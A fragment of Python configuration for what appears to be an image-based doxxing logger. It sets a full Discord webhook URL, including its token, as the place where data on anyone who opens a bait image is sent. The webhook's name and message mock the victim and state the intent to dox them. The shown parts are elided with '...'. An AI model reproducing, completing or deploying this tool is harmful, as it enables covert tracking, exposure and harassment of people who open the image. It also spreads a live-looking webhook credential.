...
config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1406700725999898778/KxgRx4Q3AU-aSHTVZL4jtw5542zXul4147pYIwl2mJgP2yCuNA3XBpAHp3SucB2JNDtN",
    ...
    # CUSTOMIZATION #
    "username": "you piss me off so get doxxed ", # Set this to the name you want the webhook to have
    ...
    "embeds": [
        {
            ...
            "color": config["color"],
            "description": f"""**a user had opened the image like a dumbass lmfaoaoaoao**
